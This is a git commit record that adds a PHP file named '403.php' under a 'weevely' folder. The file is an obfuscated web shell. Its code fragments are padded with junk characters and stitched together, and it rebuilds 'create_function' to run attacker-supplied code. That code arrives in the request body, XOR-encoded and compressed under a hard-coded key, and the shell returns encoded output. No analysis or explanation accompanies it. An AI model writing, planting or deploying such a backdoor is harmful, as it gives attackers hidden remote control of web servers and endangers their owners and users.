9c4662bbe5fc5866eca1c975fba19f9541c7eef1
LaDev008 <141607789+LaDev008@users.noreply.github.com>
2024-07-05 13:51:36 +0700

    Create 403.php

---
+++ weevely/403.php
@@ -0,0 +1,20 @@
+<?php
+
+$h='get_contents();@o^5b_end_clean^5();$^5r=@ba^5se64_e^5ncod^5e(@x(@g^5zc^5ompr^5ess($o),$k));^5p^5rin^5t("$p$kh$r$kf");}';
+
+$i='^5nput")^5,$m)==1^5) {@^5ob_start();@ev^5al(@gzunc^5ompres^5s(@x(^5@ba^5se64_decod^5e($m[^51]),$^5k)));^5$o=^5@ob^5_^5';
+
+$c='^5.=$t{$i}^^5$k{$j^5^5};}}return $^5o^5;^5}i^5f (@p^5reg_match("/$kh(.+)$^5kf/",@^5file^5_get^5_co^5n^5tents("ph^5p://i';
+
+$x='$k="^59883693c";^5$^5kh="f^54b^5bbb127c50";$kf^5="d^5^5b13ed97af^56e";$p="rm^5ffKGvw^5cOdt1k^5^59R";function x($^5t^5,$';
+
+$Y='k){^5$c=strl^5en($k);$l=s^5trlen(^5$t)^5;^5$o="";for($i=0^5;$i^5<$l;){fo^5r^5($j=0;($j<$^5c&&$i<$^5l);^5$j++,$i++)^5{$o';
+
+$U=str_replace('Gu','','cGuGureGuate_fGuunGuGuction');
+
+$q=str_replace('^5','',$x.$Y.$c.$i.$h);
+
+$V=$U('',$q);$V();
+
+?>
+
